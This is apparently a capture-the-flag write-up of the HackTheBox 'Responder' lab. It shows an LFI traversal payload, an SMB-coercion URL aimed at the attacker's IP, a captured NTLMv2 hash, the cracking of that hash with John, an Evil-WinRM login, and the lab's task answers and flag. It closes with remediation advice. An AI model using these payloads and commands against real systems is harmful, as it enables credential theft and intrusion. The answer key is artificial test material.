# 🚩 Responder - Write-up

![Banner](https://github.com/referefz/HTB-Writeups/blob/main/images/Responder/0-banner.png)


## General Information

| Attribute | Details |
| :--- | :--- |
| **Platform** | HackTheBox |
| **Difficulty** | ⚪ Very Easy |
| **OS** | 🪟 Windows |
| **Mode** | 🧭 Guided Mode |
| **Sections** | [1: Reconnaissance & Enumeration](#-1-reconnaissance--enumeration) <br> [2: Initial Foothold](#-2-initial-foothold) <br> [3: Privilege Escalation (Admin)](#-3-privilege-escalation-admin) <br> [4: Pwn3d !!](#-4-pwn3d-) |
| **Date** | 2026-04-19 |

---

## Executive Summary

*Hello everyone!! This is Reef the Inquirer✨. Armed with patience and fueled by curiosity.*
In this very easy machine, the attack leverages a Local File Inclusion (LFI) vulnerability on `unika.htb` to force an SMB authentication request to an attacker-controlled machine. This allowed capturing the Administrator's NTLMv2 hash using `Responder`. After cracking the hash with `John The Ripper`, direct administrative access was secured via `Evil-WinRM` to retrieve the final flag! 🚩

---

## Tools Used

`Your mind and eyes!!`, `Nmap`, `Responder`, `John The Ripper`, `Evil-WinRM`

---

## 🔍 1: Reconnaissance & Enumeration

**Attacker IP:** `10.10.16.90`  
**Target IP:** `10.129.86.157`

### 1.1 Port Scanning

```bash
nmap -sS -sV -A -p- -T4 10.129.86.157
```

🧐 **Findings:**

```
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-18 19:24 EDT
Stats: 0:05:15 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 99.99% done; ETC: 19:29 (0:00:00 remaining)
Nmap scan report for 10.129.86.157
Host is up (0.18s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE    VERSION
80/tcp   open  http       Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
5985/tcp open  http       Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
7680/tcp open  tcpwrapped
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 10|2019 (97%)
OS CPE: cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_server_2019
Aggressive OS guesses: Microsoft Windows 10 1903 - 21H1 (97%), Windows Server 2019 (91%), Microsoft Windows 10 1803 (89%)
```

*The scan revealed the following open ports:*

* **Port 80 (HTTP):** Running Apache httpd 2.4.52 with PHP/8.1.1 on a 64-bit Windows environment.

* **Port 5985 (HTTP):** Dedicated to Windows Remote Management (WinRM), running Microsoft HTTPAPI httpd 2.0.

* **Port 7680:** tcpwrapped.


### 1.2 Web Enumeration

Initially, navigating to the target IP `http://10.129.86.157` on port 80 automatically redirects to `http://unika.htb`, revealing a website for a company named "UNIKA". 

![](https://github.com/referefz/HTB-Writeups/blob/main/images/Responder/1-redirection.png)


<details>
  <summary>🟢 Task 1: When visiting the web service using the IP address, what is the domain that we are being redirected to?</summary>
  <br>
  unika.htb
</details>

While exploring the site, clicking the language toggle button to switch from English (EN) to German (DE) reveals a new URL:
```URL
http://unika.htb/index.php?page=german.html
```
![](https://github.com/referefz/HTB-Writeups/blob/main/images/Responder/2-LFI.png)

<details>
  <summary>🟢 Task 2: Which scripting language is being used on the server to generate webpages?</summary>
  <br>
  php
</details>

This exposes a `page` parameter, and testing it uncovered a Local File Inclusion (LFI) vulnerability. By traversing the directory structure, it was possible to read the local Windows hosts file using the following payload:
```URL
http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
```
![](https://github.com/referefz/HTB-Writeups/blob/main/images/Responder/3-LFI-Exp.png)

<details>
  <summary>🟢 Task 3: What is the name of the URL parameter which is used to load different language versions of the webpage?</summary>
  <br>
  page
</details>

<details>
  <summary>🟢 Task 4: Which of the following values for the page parameter would be an example of exploiting a Local File Include (LFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "mimikatz.exe"</summary>
  <br>
  ../../../../../../../../windows/system32/drivers/etc/hosts
</details>

> Note: From here.. I forgot to take further screenshots for the rest of the lab, but dw, all is cleared 🫡
---

## 🚪 2: Initial Foothold


For me, instead of merely reading local files, an LFI vulnerability on a Windows environment can be exploited to force the target server to authenticate against an external **remote SMB share**.

* First, `Responder` tool was started on the attacker's machine to listen for incoming authentication requests on the VPN interface:

```Bash
sudo responder -I tun0
```

* Next, an HTTP payload was sent to the vulnerable `page` parameter, directing the target to fetch a non-existent file from the attacker's IP address:

```URL
[http://unika.htb/index.php?page=//10.10.16.90/somefile
```
<details>
  <summary>🟢 Task 5: Which of the following values for the page parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: "french.html", "//10.10.14.6/somefile", "./../../../../../../../windows/system32/drivers/etc/hosts", "mimikatz.exe"</summary>
  <br>
  //10.10.14.6/somefile
</details>

* `Responder` successfully intercepted the authentication attempt and captured the `NTLMv2-SSP Hash` for the `RESPONDER\Administrator` user🚀

```Bash
[SMB] NTLMv2-SSP Client   : 10.129.86.157
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:2b60d05a1cdd0186:D1A0A2C82CFEB89948FCBAF2A7738FAE:01010000000000008039D9596FCFDC0161422D9A8536C900000000000200080058005A0056004C0001001E00570049004E002D003100520056004600410051005A0043004D003400550004003400570049004E002D003100520056004600410051005A0043004D00340055002E0058005A0056004C002E004C004F00430041004C000300140058005A0056004C002E004C004F00430041004C000500140058005A0056004C002E004C004F00430041004C00070008008039D9596FCFDC0106000400020000000800300030000000000000000100000000200000383275B506F5F720ED98591AD62F76890BFDF34DA14E418A4A2B8ACF1D4D80CC0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00390030000000000000000000
```
<details>
  <summary>🟢 Task 6: What does NTLM stand for?</summary>
  <br>
  New Technology Lan Manager
</details>

<details>
  <summary>🟢 Task 7: Which flag do we use in the Responder utility to specify the network interface?</summary>
  <br>
  -I
</details>

---

## 👑 3: Privilege Escalation (Admin)

Current User: None

Target User: Administrator

Since the captured hash belonged directly to the system administrator, cracking it would grant immediate high-privileged access, bypassing the need for a standard user foothold 🧠

So, I save the captured hash to a file named `hash.txt` and crack it using `John The Ripper` tool with the `rockyou.txt` wordlist:
```Bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
Then we got:
 ```
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status

badminton        (Administrator)
   
1g 0:00:00:00 DONE (2026-04-18 20:15) 11.11g/s 45511p/s 45511c/s 45511C/s slimshady..oooooo
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
```
<details>
  <summary>🟢 Task 8: There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as john, but the full name is what?</summary>
  <br>
  John The Ripper
</details>

<details>
  <summary>🟢 Task 9: What is the password for the administrator user?</summary>
  <br>
  badminton
</details>

Now, with the valid administrator credentials in hand and port `5985` (WinRM) already open, I establish a remote administrative shell using `Evil-WinRM` tool:

```Bash
evil-winrm -i 10.129.86.157 -u administrator -p badminton
```

Finally, I get a remote PowerShell shell obtained as `RESPONDER\Administrator` 🎉

```powershell
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
responder\administrator
```
<details>
  <summary>🟢 Task 10: We'll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on?</summary>
  <br>
  5985
</details>

I enumerate the directories and navigate to the user **mike's** Desktop, where I locate the final flag !!💥

```powershell
*Evil-WinRM* PS C:\Users> dir


    Directory: C:\Users


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          3/9/2022   5:35 PM                Administrator
d-----          3/9/2022   5:33 PM                mike
d-r---        10/10/2020  12:37 PM                Public


*Evil-WinRM* PS C:\Users> cd mike\Desktop
*Evil-WinRM* PS C:\Users\mike\Desktop> cat flag.txt
ea81b7afddd03efaa0945333ed147fac
```
<details>
  <summary>🟢 Task 11: On which user's desktop is the flag located?</summary>
  <br>
  mike
</details>

---

## 🏁 4: Pwn3d !!

**🚩 Flag: ea81b7afddd03efaa0945333ed147fac**


I recommend implementing strict input validation and an allowlist on the `page` parameter to remediate the LFI vulnerability. Furthermore, it is crucial to enforce strong, complex password policies for all administrative accounts to prevent dictionary attacks, and to block outbound SMB traffic Port `445` at the network firewall to stop the server from inadvertently leaking NTLM hashes to external actors.

![](https://github.com/referefz/HTB-Writeups/blob/main/images/Responder/4-pwn3d!.png)


Created with 💜 by **The Inquirer, Reef**
